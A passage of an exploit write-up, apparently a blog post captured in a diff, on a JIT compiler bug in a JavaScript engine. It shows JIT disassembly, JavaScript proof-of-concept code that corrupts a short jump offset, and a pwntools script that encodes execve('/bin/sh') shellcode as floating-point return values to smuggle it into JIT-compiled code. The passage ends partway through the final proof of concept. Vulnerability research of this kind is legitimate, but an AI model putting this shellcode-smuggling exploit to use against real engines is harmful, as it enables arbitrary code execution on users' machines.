+</span></span><span class="line"><span class="cl">0x00007f4c10fac2b7  7f 00 00
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2ba  ff d0                 call   eax
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2bc  48 83 c4 08           add    rsp,0x08
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2c0  5f                    pop    rdi
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2c1  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">4:20 LoadImmediate 43434343:
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2c4  48 b8 67 c1 96 02 00  mov    rax, 0x7ffa00000296c167
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2cb  00 fa 7f
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2ce  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">4:40 Return:
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2d1  4c 89 e0              mov    rax,r12
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2d4  48 89 43 20           mov    [rbx+0x20],rax
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2d8  eb 03                 jmp    short 10fac2dd &lt;common_exit&gt;
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2da  0f 1f 00              nop    [rax]
+</span></span><span class="line"><span class="cl">common_exit:
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2dd  4c 89 23              mov    [rbx],r12
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2e0  41 5f                 pop    r15
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2e2  41 5e                 pop    r14
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2e4  41 5d                 pop    r13
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2e6  41 5c                 pop    r12
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2e8  5b                    pop    rbx
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2e9  5b                    pop    rbx
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2ea  c9                    leave
+</span></span><span class="line"><span class="cl">0x00007f4c10fac2eb  c3                    ret
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The offset increment by <code>0xd</code> upon adding a new constant value to be returned demonstrates a potential approach to exploit the bug. By experimenting with various patterns, I discovered a specific code snippet that successfully triggers the bug.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">test</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">===</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="mi">2</span> <span class="o">===</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="mi">4141414141</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span><span class="nx">test</span><span class="p">();}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Hello World&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here is the disassembly following our adjustments:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Block 4:
+</span></span><span class="line"><span class="cl">4:0 NewPrimitiveArray [ 4141414141 ]:
+</span></span><span class="line"><span class="cl">0x00007f52f0c364c6  48 be b8 51 dc c4 e5  mov    rsi, 0x000055e5c4dc51b8
+</span></span><span class="line"><span class="cl">0x00007f52f0c364cd  55 00 00
+</span></span><span class="line"><span class="cl">0x00007f52f0c364d0  ba 01 00 00 00        mov    edx, 0x00000001
+</span></span><span class="line"><span class="cl">0x00007f52f0c364d5  57                    push   rdi
+</span></span><span class="line"><span class="cl">0x00007f52f0c364d6  6a 00                 push   0x00
+</span></span><span class="line"><span class="cl">0x00007f52f0c364d8  48 b8 d0 37 4a f1 52  mov    rax, 0x00007f52f14a37d0
+</span></span><span class="line"><span class="cl">0x00007f52f0c364df  7f 00 00
+</span></span><span class="line"><span class="cl">0x00007f52f0c364e2  ff d0                 call   eax
+</span></span><span class="line"><span class="cl">0x00007f52f0c364e4  48 83 c4 08           add    rsp,0x08
+</span></span><span class="line"><span class="cl">0x00007f52f0c364e8  5f                    pop    rdi
+</span></span><span class="line"><span class="cl">0x00007f52f0c364e9  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">4:20 Return:
+</span></span><span class="line"><span class="cl">0x00007f52f0c364ec  4c 89 e0              mov    rax,r12
+</span></span><span class="line"><span class="cl">0x00007f52f0c364ef  48 89 43 20           mov    [rbx+0x20],rax
+</span></span><span class="line"><span class="cl">0x00007f52f0c364f3  eb 81                 jmp    short f0c36476 &lt;2:a0+0x31&gt;
+</span></span><span class="line"><span class="cl">0x00007f52f0c364f5  0f 1f 00              nop    [rax]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Block 5:
+</span></span><span class="line"><span class="cl">5:0 LoadImmediate undefined:
+</span></span><span class="line"><span class="cl">0x00007f52f0c364f8  48 b8 00 00 00 00 00  mov    rax, 0x7ffe000000000000
+</span></span><span class="line"><span class="cl">0x00007f52f0c364ff  00 fe 7f
+</span></span><span class="line"><span class="cl">0x00007f52f0c36502  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">5:20 LoadImmediate 0:
+</span></span><span class="line"><span class="cl">0x00007f52f0c36505  48 b8 00 00 00 00 00  mov    rax, 0x7ffa000000000000
+</span></span><span class="line"><span class="cl">0x00007f52f0c3650c  00 fa 7f
+</span></span><span class="line"><span class="cl">0x00007f52f0c3650f  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">5:40 LoadImmediate 1:
+</span></span><span class="line"><span class="cl">0x00007f52f0c36512  48 b8 01 00 00 00 00  mov    rax, 0x7ffa000000000001
+</span></span><span class="line"><span class="cl">0x00007f52f0c36519  00 fa 7f
+</span></span><span class="line"><span class="cl">0x00007f52f0c3651c  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">5:60 LoadImmediate 2:
+</span></span><span class="line"><span class="cl">0x00007f52f0c3651f  48 b8 02 00 00 00 00  mov    rax, 0x7ffa000000000002
+</span></span><span class="line"><span class="cl">0x00007f52f0c36526  00 fa 7f
+</span></span><span class="line"><span class="cl">0x00007f52f0c36529  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">5:80 LoadImmediate 3:
+</span></span><span class="line"><span class="cl">0x00007f52f0c3652c  48 b8 03 00 00 00 00  mov    rax, 0x7ffa000000000003
+</span></span><span class="line"><span class="cl">0x00007f52f0c36533  00 fa 7f
+</span></span><span class="line"><span class="cl">0x00007f52f0c36536  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">5:a0 LoadImmediate 4:
+</span></span><span class="line"><span class="cl">0x00007f52f0c36539  48 b8 04 00 00 00 00  mov    rax, 0x7ffa000000000004
+</span></span><span class="line"><span class="cl">0x00007f52f0c36540  00 fa 7f
+</span></span><span class="line"><span class="cl">0x00007f52f0c36543  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">5:c0 LoadImmediate 5:
+</span></span><span class="line"><span class="cl">0x00007f52f0c36546  48 b8 05 00 00 00 00  mov    rax, 0x7ffa000000000005
+</span></span><span class="line"><span class="cl">0x00007f52f0c3654d  00 fa 7f
+</span></span><span class="line"><span class="cl">0x00007f52f0c36550  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">5:e0 Return:
+</span></span><span class="line"><span class="cl">0x00007f52f0c36553  4c 89 e0              mov    rax,r12
+</span></span><span class="line"><span class="cl">0x00007f52f0c36556  48 89 43 20           mov    [rbx+0x20],rax
+</span></span><span class="line"><span class="cl">0x00007f52f0c3655a  eb 1a                 jmp    short f0c36576 &lt;common_exit&gt;
+</span></span><span class="line"><span class="cl">0x00007f52f0c3655c  0f 1f 00              nop    [rax]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Block 6:
+</span></span><span class="line"><span class="cl">6:0 LoadImmediate undefined:
+</span></span><span class="line"><span class="cl">0x00007f52f0c3655f  48 b8 00 00 00 00 00  mov    rax, 0x7ffe000000000000
+</span></span><span class="line"><span class="cl">0x00007f52f0c36566  00 fe 7f
+</span></span><span class="line"><span class="cl">0x00007f52f0c36569  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">6:20 Jump @7:
+</span></span><span class="line"><span class="cl">0x00007f52f0c3656c  eb 03                 jmp    short f0c36571 &lt;Block 7&gt;
+</span></span><span class="line"><span class="cl">0x00007f52f0c3656e  0f 1f 00              nop    [rax]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Block 7:
+</span></span><span class="line"><span class="cl">7:0 Jump @4:
+</span></span><span class="line"><span class="cl">0x00007f52f0c36571  e9 50 ff ff ff        jmp    f0c364c6 &lt;Block 4&gt;
+</span></span><span class="line"><span class="cl">common_exit:
+</span></span><span class="line"><span class="cl">0x00007f52f0c36576  4c 89 23              mov    [rbx],r12
+</span></span><span class="line"><span class="cl">0x00007f52f0c36579  41 5f                 pop    r15
+</span></span><span class="line"><span class="cl">0x00007f52f0c3657b  41 5e                 pop    r14
+</span></span><span class="line"><span class="cl">0x00007f52f0c3657d  41 5d                 pop    r13
+</span></span><span class="line"><span class="cl">0x00007f52f0c3657f  41 5c                 pop    r12
+</span></span><span class="line"><span class="cl">0x00007f52f0c36581  5b                    pop    rbx
+</span></span><span class="line"><span class="cl">0x00007f52f0c36582  5b                    pop    rbx
+</span></span><span class="line"><span class="cl">0x00007f52f0c36583  c9                    leave
+</span></span><span class="line"><span class="cl">0x00007f52f0c36584  c3                    ret
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Upon closer examination, we observed that during the process of returning <code>[41414141]</code>, the <code>jmp short</code> instruction becomes corrupted, transforming into <code>jmp short 0x81</code>. This alteration causes the instruction to jump backward. The objective now shifts to adjusting our POC, aiming to redirect the corrupted <code>jmp rel8</code> destination to a segment of bytecode under our control. The following JavaScript code achieves this by successfully setting the jump destination to bytecode we manipulate.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">test</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">===</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="mi">2</span> <span class="o">===</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mf">2261634.5098039214</span> <span class="p">,</span><span class="mf">2261634.5098039214</span><span class="p">,{},[</span><span class="mi">4444</span><span class="p">],[</span><span class="mi">5555</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span><span class="nx">test</span><span class="p">();}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Hello World&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Block 4:
+</span></span><span class="line"><span class="cl">4:0 LoadImmediate 2261634.5098039214:
+</span></span><span class="line"><span class="cl">0x00007f7617c494c6  48 b8 41 41 41 41 41  mov    rax, 0x4141414141414141
+</span></span><span class="line"><span class="cl">0x00007f7617c494cd  41 41 41
+</span></span><span class="line"><span class="cl">0x00007f7617c494d0  49 89 c4              mov    r12,rax
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">4:98 Return:
+</span></span><span class="line"><span class="cl">0x00007f47048d8543  4c 89 e0              mov    rax,r12
+</span></span><span class="line"><span class="cl">0x00007f47048d8546  48 89 43 20           mov    [rbx+0x20],rax
+</span></span><span class="line"><span class="cl">0x00007f47048d854a  eb 81                 jmp    short 48d84cd &lt;Block 4+0x7&gt;
+</span></span><span class="line"><span class="cl">0x00007f47048d854c  0f 1f 00              nop    [rax]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notably, the <code>&lt;Block 4+0x7&gt;</code> falls under our control, as it represents part of the hexadecimal encoding of our floating-point parameter (<code>2261634.5098039214</code>, which translates to <code>0x4141414141414141</code>). We can smuggle our shellcode into the JIT-compiled code. By making the return statement to include additional values that represent our shellcode in floating-point format, we can effectively insert executable code into the JIT process.</p>
+<p>What I did here involves smuggling shellcode by appending additional values to the return statement. Specifically, within the <code>&lt;Block 4+0x7&gt;</code>, I did another backward jump that directs execution to the previously smuggled shellcode. For the creation of this smuggled shellcode, I used the script detailed below:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Taken from https://ctftime.org/writeup/29915</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;amd64&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">instructions</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;mov ebx, 0x0068732f&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;shl rbx, 32&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;mov edx, 0x6e69622f&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;add rbx, rdx&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;push rbx&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;xor eax, eax&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;mov al, 0x3b&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;mov rdi, rsp&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;xor edx, edx&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;xor rsi, rsi&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;syscall&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Marker constant</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">bytecode</span> <span class="o">=</span> <span class="p">[</span><span class="n">asm</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">instructions</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">jmp</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;jmp $+7&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">bytecode</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">6</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">buf</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">jmp</span>
+</span></span><span class="line"><span class="cl">        <span class="n">buf</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">buf</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+=</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x41</span><span class="s1">&#39;</span> <span class="c1"># Prevent our floating point has negative number</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">instructions</span><span class="p">,</span> <span class="n">bytecode</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">return_statement</span> <span class="o">=</span> <span class="s1">&#39;return &#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">buf</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ERROR: CHUNK </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> TOO LONG&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">disasm</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;d&#34;</span><span class="p">,</span> <span class="n">n</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">return_statement</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">f</span><span class="si">}</span><span class="s1">, &#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">jmp_backward</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;d&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;aaaaa&#39;</span><span class="o">+</span><span class="n">asm</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;jmp $</span><span class="si">{</span><span class="o">-</span><span class="mi">7</span><span class="o">-</span><span class="mi">13</span><span class="o">*</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">-</span><span class="mi">11</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">return_statement</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">jmp_backward</span><span class="si">}</span><span class="s1">, &#39;</span> <span class="c1"># another backward jump to the starting of our smuggled shellcode</span>
+</span></span><span class="line"><span class="cl"><span class="n">return_statement</span> <span class="o">+=</span> <span class="s1">&#39;2261634.5098039214,</span><span class="si">{}</span><span class="s1">,[4444],[5555];&#39;</span> <span class="c1"># padding</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">return_statement</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Following the shellcode generation, we just need to put the generated return statement to our previous POC:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">test</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">===</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="mi">2</span> <span class="o">===</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
